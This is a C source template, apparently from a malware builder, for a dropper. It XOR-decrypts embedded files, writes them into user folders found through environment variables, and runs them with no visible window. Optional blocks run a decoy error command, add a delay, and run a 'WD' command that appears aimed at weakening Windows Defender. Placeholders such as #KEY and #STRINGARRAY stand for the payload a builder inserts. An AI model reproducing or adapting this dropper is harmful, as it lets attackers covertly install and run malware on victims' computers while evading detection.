#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

char* cipher(char* data, long dataLen) {
	char* key = "#KEY";
	int keyLen = strlen(key);
	char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; ++i) {
		output[i] = data[i] ^ key[i % keyLen];
	}
	return output;
}

int write_file(char* file, unsigned char* buffer, long length){
	FILE *write_ptr;
	write_ptr = fopen(file,"wb");
	int result = fwrite(buffer, length, 1, write_ptr);
	fclose(write_ptr);
	return result;
}

int run_program(char* file, char* arguments){
	PROCESS_INFORMATION p_info;
	STARTUPINFO s_info;

	memset(&s_info, 0, sizeof(s_info));
	memset(&p_info, 0, sizeof(p_info));
	s_info.cb = sizeof(s_info); 

	if(CreateProcess(file, arguments, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info)){
		CloseHandle(p_info.hProcess);
		CloseHandle(p_info.hThread);
		return 1;
	}
	return 0;
}

int main(int argc, char **argv) 
{
#if DefError
	run_program(NULL, cipher("#ERRORCOMMAND", #ERRORCOMMANDLENGTH));
#endif
#if DefDelay
	sleep(#DELAY * 1000);
#endif
#if DefWD
	run_program(NULL, cipher("#WDCOMMAND", #WDCOMMANDLENGTH));
#endif
	char* stringarray[#ARRAYCOUNT][3] = {#STRINGARRAY};
	long intarray[#ARRAYCOUNT][4] = {#INTARRAY};

	char commandholder[MAX_PATH+1000];
	char runcommand[MAX_PATH+1000];

	for(int i = 0; i < #ARRAYCOUNT; ++i){
		sprintf(commandholder, "%s\\%s", getenv(stringarray[i][0]), cipher(stringarray[i][1], intarray[i][0]));
		write_file(commandholder, cipher(stringarray[i][2], intarray[i][2]), intarray[i][2]);
		if(intarray[i][1]){
			sprintf(runcommand, "%s %s", cipher("#COMMANDRUN", #COMMANDRUNLENGTH), commandholder);
			run_program(NULL, runcommand);
		}
	}
	return 0;
}